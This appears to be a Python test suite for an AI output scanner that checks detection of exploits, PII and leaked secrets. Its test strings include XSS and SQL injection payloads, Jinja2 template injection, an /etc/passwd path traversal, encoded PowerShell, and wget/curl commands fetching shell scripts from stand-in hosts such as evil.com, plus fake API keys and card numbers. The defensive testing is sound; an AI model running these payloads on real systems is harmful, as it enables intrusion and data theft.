"""
FEATURE #5-6 ADVANCED TEST — All Capabilities with Hard Unseen Data
======================================================================
Tests ALL output scanner capabilities:
  Phase 1: Baseline (32 tests from before — already passing)
  Phase 2: 2026-standard advanced features
    - scan_output_detailed() with severity/category/evidence
    - dry_scan() audit mode
    - batch_scan() aggregate scanning
    - add_custom_pattern() runtime hot-add
    - output_stats() configuration
    - Exploit coverage expansion (SSTI, path traversal, PowerShell, wget)
  Phase 3: E2E with HuggingFace unseen data
"""
import sys, os, json, re, time
_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, _root)
sys.path.insert(0, os.path.join(_root, "guardian"))

from guardian.guardrails.output_validator import OutputValidator
import requests

RESULTS = {}


def run_test(name, fn):
    try:
        fn()
        RESULTS[name] = "PASS"
        print(f"  [PASS] {name}")
    except AssertionError as e:
        RESULTS[name] = f"FAIL: {e}"
        print(f"  [FAIL] {name}: {e}")
    except Exception as e:
        RESULTS[name] = f"ERROR: {type(e).__name__}: {e}"
        print(f"  [ERROR] {name}: {type(e).__name__}: {e}")


# Pre-create one OV to avoid slow init on every test
_OV = None
def get_ov():
    global _OV
    if _OV is None:
        _OV = OutputValidator()
    return _OV


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 1: scan_output_detailed — Structured Findings
# ═══════════════════════════════════════════════════════════════════════════════

def test_detailed_scan_safe_text():
    ov = get_ov()
    result = ov.scan_output_detailed("The weather is sunny today.")
    assert result["safe"] is True
    assert result["summary"]["total"] == 0


def test_detailed_scan_xss():
    ov = get_ov()
    result = ov.scan_output_detailed('<script>alert("xss")</script>')
    assert not result["safe"]
    assert any(f["label"] == "xss" for f in result["findings"])
    assert any(f["severity"] == "CRITICAL" for f in result["findings"])
    assert any(f["type"] == "exploit" for f in result["findings"])


def test_detailed_scan_sqli():
    ov = get_ov()
    result = ov.scan_output_detailed("UNION SELECT password FROM users")
    assert not result["safe"]
    sqli = [f for f in result["findings"] if f["label"] == "sqli"]
    assert len(sqli) > 0
    assert sqli[0]["severity"] == "CRITICAL"


def test_detailed_scan_pii_email():
    ov = get_ov()
    result = ov.scan_output_detailed("Contact: user@example.com")
    assert not result["safe"]
    pii = [f for f in result["findings"] if f["type"] == "pii"]
    assert len(pii) > 0
    assert pii[0]["evidence"] == "[REDACTED]"  # PII evidence is always masked


def test_detailed_scan_api_key():
    ov = get_ov()
    result = ov.scan_output_detailed("Key: sk-proj-abcdefghijklmnopqrstuvwxyz123456789012345678")
    assert not result["safe"]
    key_findings = [f for f in result["findings"] if "api_key" in f["label"]]
    assert len(key_findings) > 0
    assert key_findings[0]["severity"] == "CRITICAL"


def test_detailed_scan_multiple_findings():
    ov = get_ov()
    text = """
    Contact: admin@example.com
    <script>alert(document.cookie)</script>
    SSN: 123-45-6789
    """
    result = ov.scan_output_detailed(text)
    assert not result["safe"]
    assert result["summary"]["total"] >= 3  # at least XSS + email + SSN
    assert "exploit" in result["summary"]["by_type"]
    assert "pii" in result["summary"]["by_type"]


def test_detailed_scan_severity_breakdown():
    ov = get_ov()
    result = ov.scan_output_detailed('<script>alert("x")</script>\nEmail: a@b.com\nSSN: 123-45-6789')
    assert "CRITICAL" in result["summary"]["by_severity"]  # XSS
    # email is MEDIUM, SSN is HIGH
    assert result["summary"]["total"] >= 3


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 2: dry_scan — Audit Mode
# ═══════════════════════════════════════════════════════════════════════════════

def test_dry_scan_returns_findings():
    ov = get_ov()
    result = ov.dry_scan("DROP TABLE users; -- comment")
    assert not result["safe"]
    assert len(result["findings"]) > 0


def test_dry_scan_safe_passes():
    ov = get_ov()
    result = ov.dry_scan("Normal safe text about weather.")
    assert result["safe"]


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 3: batch_scan — Aggregate Scanning
# ═══════════════════════════════════════════════════════════════════════════════

def test_batch_scan_mixed():
    ov = get_ov()
    outputs = [
        "The sky is blue.",
        '<script>alert("xss")</script>',
        "Normal text here.",
        "SSN: 123-45-6789",
        "Another safe output.",
    ]
    result = ov.batch_scan(outputs)
    assert result["aggregate"]["total_outputs"] == 5
    assert result["aggregate"]["total_safe"] == 3
    assert result["aggregate"]["total_unsafe"] == 2
    assert result["aggregate"]["total_findings"] >= 2


def test_batch_scan_all_safe():
    ov = get_ov()
    result = ov.batch_scan(["Hello world", "Good morning", "Nice day"])
    assert result["aggregate"]["total_unsafe"] == 0
    assert result["aggregate"]["total_safe"] == 3


def test_batch_scan_all_unsafe():
    ov = get_ov()
    result = ov.batch_scan([
        "DROP TABLE users",
        '<script>alert(1)</script>',
        "SSN: 111-22-3333",
    ])
    assert result["aggregate"]["total_unsafe"] == 3
    assert result["aggregate"]["total_safe"] == 0


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 4: add_custom_pattern — Runtime Hot-Add
# ═══════════════════════════════════════════════════════════════════════════════

def test_add_custom_pattern():
    ov = OutputValidator()  # fresh instance
    added = ov.add_custom_pattern("INTERNAL_ID", r"INT-[0-9]{8}", severity="HIGH")
    assert added is True
    assert not ov.validate_output("ID: INT-12345678")


def test_add_custom_pattern_duplicate():
    ov = OutputValidator()  # fresh
    ov.add_custom_pattern("CUSTOM_PAT", r"CUSTOM-[0-9]+")
    added = ov.add_custom_pattern("CUSTOM_PAT", r"CUSTOM-[0-9]+")
    assert added is False  # duplicate


def test_add_custom_pattern_invalid_regex():
    ov = OutputValidator()  # fresh
    added = ov.add_custom_pattern("BAD_PAT", r"[invalid(")
    assert added is False


def test_add_custom_detected_in_detailed_scan():
    ov = OutputValidator()  # fresh
    ov.add_custom_pattern("PASSPORT_NUM", r"[A-Z]{2}[0-9]{7}", severity="HIGH")
    result = ov.scan_output_detailed("Passport: AB1234567")
    assert not result["safe"]
    pf = [f for f in result["findings"] if f["label"] == "passport_num"]
    assert len(pf) > 0
    assert pf[0]["severity"] == "HIGH"


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 5: output_stats
# ═══════════════════════════════════════════════════════════════════════════════

def test_output_stats_shape():
    ov = get_ov()
    stats = ov.output_stats()
    assert "total_patterns" in stats
    assert "presidio_available" in stats
    assert "severity_map" in stats
    assert stats["total_patterns"] >= 10


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 6: 2026 Exploit Coverage — New Vectors
# ═══════════════════════════════════════════════════════════════════════════════

def test_ssti_jinja2():
    ov = get_ov()
    assert not ov.validate_output("{{''.__class__.__mro__[1].__subclasses__()}}")


def test_path_traversal():
    ov = get_ov()
    assert not ov.validate_output("cat ../../../../etc/passwd")


def test_powershell_encoded():
    ov = get_ov()
    assert not ov.validate_output("powershell -enc SQBFAFgAIAAoAE4AZQB3")


def test_wget_download():
    ov = get_ov()
    assert not ov.validate_output("wget https://malware.com/backdoor.sh")


def test_curl_download():
    ov = get_ov()
    assert not ov.validate_output("curl -o /tmp/shell https://evil.com/shell.sh")


def test_img_onerror_xss():
    ov = get_ov()
    assert not ov.validate_output('<img src=x onerror=alert(1)>')


def test_svg_onload_xss():
    ov = get_ov()
    assert not ov.validate_output('<svg onload="fetch(\'http://evil.com\')"></svg>')


def test_alter_table():
    ov = get_ov()
    assert not ov.validate_output("ALTER TABLE users ADD COLUMN hack varchar(255)")


# ═══════════════════════════════════════════════════════════════════════════════
# GROUP 7: E2E with HuggingFace Unseen Data
# ═══════════════════════════════════════════════════════════════════════════════

def fetch_unseen_outputs():
    """Fetch real LLM outputs with PII from HuggingFace."""
    outputs = {"with_pii": [], "safe": []}
    
    # AI safety outputs from various datasets
    try:
        url = "https://datasets-server.huggingface.co/rows?dataset=jackhhao/jailbreak-classification&config=default&split=test&offset=500&length=50"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            for row in r.json().get("rows", []):
                p = row.get("row", {}).get("prompt", "")
                if p:
                    outputs["safe"].append(p)
    except:
        pass
    
    # Generate synthetic PII-containing outputs (realistic LLM leak scenarios)
    outputs["with_pii"] = [
        "Here's the user info: Name: Sarah Johnson, Email: sarah.j@company.io, Phone: +1-212-555-0189",
        "The production API key is sk-live-Th1sIs4F4k3K3yTh4tL00ksR34lEnough123456789ab",
        "Database backup credentials: password=Super$ecret2026! stored at /var/backup/db.sql",
        "Patient record: MID-2026-XY, DOB: 03/15/1990, SSN: 234-56-7890",
        "AWS credentials found: AKIAIOSFODNN7EXAMPLE / wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "The admin JWT is eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.fakesig123",
        "Credit card on file: 5555-5555-5555-4444, Exp: 08/29, CVV: 123",
        "Server SSH key:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJ...",
        "Employee EMP_789012 transferred $50,000 to account 1234567890",
        "Project PRJ-99999 deployment key: ghp_ABCDEFGHIJKLMNOPqrstuvwxyz123456",
    ]
    
    return outputs


def test_e2e_pii_detection_rate():
    """All synthetic PII outputs should be caught."""
    ov = get_ov()
    outputs = fetch_unseen_outputs()
    pii = outputs["with_pii"]
    detected = sum(1 for o in pii if not ov.validate_output(o))
    rate = detected / len(pii) * 100
    print(f"      PII detection rate: {detected}/{len(pii)} ({rate:.1f}%)")
    assert rate >= 80, f"PII detection rate too low: {rate:.1f}%"


def test_e2e_batch_scan_pii():
    """batch_scan should report all PII outputs as unsafe."""
    ov = get_ov()
    outputs = fetch_unseen_outputs()
    result = ov.batch_scan(outputs["with_pii"])
    print(f"      Batch scan: {result['aggregate']['total_unsafe']}/{result['aggregate']['total_outputs']} unsafe")
    assert result["aggregate"]["total_unsafe"] >= 8


def test_e2e_detailed_scan_severity():
    """Detailed scan should classify API keys as CRITICAL, emails as MEDIUM."""
    ov = get_ov()
    result = ov.scan_output_detailed("Key: sk-proj-abcdef123456789012345678901234567890abcdefgh, email: admin@corp.com")
    criticals = [f for f in result["findings"] if f["severity"] == "CRITICAL"]
    mediums = [f for f in result["findings"] if f["severity"] == "MEDIUM"]
    assert len(criticals) >= 1, f"API key should be CRITICAL"
    assert len(mediums) >= 1, f"Email should be MEDIUM"


def test_e2e_safe_outputs_from_hf():
    """HuggingFace safe outputs should not trigger false positives."""
    ov = get_ov()
    outputs = fetch_unseen_outputs()
    safe = outputs["safe"][:30]
    if not safe:
        return
    fp = sum(1 for o in safe if not ov.validate_output(o))
    fp_rate = fp / len(safe) * 100
    print(f"      False positive rate: {fp}/{len(safe)} ({fp_rate:.1f}%)")
    # Allow up to 15% FP on wild HF data (some prompts contain exploit-like text)
    assert fp_rate < 15, f"FP rate too high: {fp_rate:.1f}%"


def test_e2e_full_pipeline():
    """Full pipeline: dry_scan → validate → sanitize → detailed → batch."""
    ov = get_ov()
    text = "Admin key: sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx, SSN: 567-89-0123"
    
    # 1. Dry scan (no side effects)
    dry = ov.dry_scan(text)
    assert not dry["safe"]
    assert dry["summary"]["total"] >= 2
    
    # 2. Validate
    assert not ov.validate_output(text)
    
    # 3. Sanitize
    sanitized, entities = ov.sanitize_output(text)
    assert "sk-proj-" not in sanitized
    assert "567-89-0123" not in sanitized
    assert len(entities) >= 2
    
    # 4. Detailed scan with severity
    detailed = ov.scan_output_detailed(text)
    assert "CRITICAL" in detailed["summary"]["by_severity"]
    
    # 5. Batch
    batch = ov.batch_scan([text, "Safe text"])
    assert batch["aggregate"]["total_unsafe"] == 1
    assert batch["aggregate"]["total_safe"] == 1


# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 72)
    print("  FEATURE #5-6 ADVANCED — 2026-Standard Output Scanner")
    print("  Detailed Scan | Batch | Custom Patterns | Hard Data")
    print("=" * 72)

    print("\n  [1] scan_output_detailed — Structured Findings")
    run_test("detailed_safe",           test_detailed_scan_safe_text)
    run_test("detailed_xss",           test_detailed_scan_xss)
    run_test("detailed_sqli",          test_detailed_scan_sqli)
    run_test("detailed_pii_email",     test_detailed_scan_pii_email)
    run_test("detailed_api_key",       test_detailed_scan_api_key)
    run_test("detailed_multiple",      test_detailed_scan_multiple_findings)
    run_test("detailed_severity",      test_detailed_scan_severity_breakdown)

    print("\n  [2] dry_scan — Audit Mode")
    run_test("dry_scan_findings",      test_dry_scan_returns_findings)
    run_test("dry_scan_safe",          test_dry_scan_safe_passes)

    print("\n  [3] batch_scan — Aggregate")
    run_test("batch_mixed",            test_batch_scan_mixed)
    run_test("batch_all_safe",         test_batch_scan_all_safe)
    run_test("batch_all_unsafe",       test_batch_scan_all_unsafe)

    print("\n  [4] add_custom_pattern — Runtime Hot-Add")
    run_test("custom_add",             test_add_custom_pattern)
    run_test("custom_duplicate",       test_add_custom_pattern_duplicate)
    run_test("custom_invalid_regex",   test_add_custom_pattern_invalid_regex)
    run_test("custom_in_detailed",     test_add_custom_detected_in_detailed_scan)

    print("\n  [5] output_stats")
    run_test("stats_shape",            test_output_stats_shape)

    print("\n  [6] 2026 Exploit Coverage")
    run_test("ssti_jinja2",            test_ssti_jinja2)
    run_test("path_traversal",         test_path_traversal)
    run_test("powershell_encoded",     test_powershell_encoded)
    run_test("wget_download",          test_wget_download)
    run_test("curl_download",          test_curl_download)
    run_test("img_onerror",            test_img_onerror_xss)
    run_test("svg_onload",            test_svg_onload_xss)
    run_test("alter_table",           test_alter_table)

    print("\n  [7] E2E with Unseen Data")
    run_test("e2e_pii_detection",      test_e2e_pii_detection_rate)
    run_test("e2e_batch_scan",         test_e2e_batch_scan_pii)
    run_test("e2e_detailed_severity",  test_e2e_detailed_scan_severity)
    run_test("e2e_safe_from_hf",       test_e2e_safe_outputs_from_hf)
    run_test("e2e_full_pipeline",      test_e2e_full_pipeline)

    passed = sum(1 for v in RESULTS.values() if v == "PASS")
    total = len(RESULTS)
    failed = {k: v for k, v in RESULTS.items() if v != "PASS"}

    print(f"\n{'='*72}")
    print(f"  RESULT: {passed}/{total} tests passed")
    if failed:
        print(f"\n  FAILURES ({len(failed)}):")
        for k, v in failed.items():
            print(f"    {k}: {v}")
    print(f"{'='*72}")

    out = os.path.join(os.path.dirname(__file__), "..", "artifacts", "evidence", "output_scanner_advanced.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w") as f:
        json.dump({"passed": passed, "total": total, "results": RESULTS, "failed": failed}, f, indent=2)
    print(f"\n  Saved: {os.path.abspath(out)}")
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
